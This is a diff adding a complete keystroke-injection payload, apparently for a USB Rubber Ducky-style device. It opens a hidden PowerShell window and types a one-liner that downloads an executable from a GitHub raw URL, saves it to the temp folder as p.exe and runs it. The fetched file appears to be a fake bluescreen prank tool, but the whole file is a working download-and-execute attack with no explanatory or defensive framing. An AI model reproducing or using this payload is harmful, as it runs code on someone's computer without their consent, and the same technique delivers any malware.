@@ -1,0 +1,8 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 500
+STRING $exe = (New-Object Net.WebClient).DownloadData('https://raw.githubusercontent.com/un4ckn0wl3z/fakebsod/refs/heads/main/BluescreenSimulator.exe');$path = "$env:TEMP\p.exe";[IO.File]::WriteAllBytes($path, $exe);Start-Process $path -ArgumentList '--win10'
+ENTER
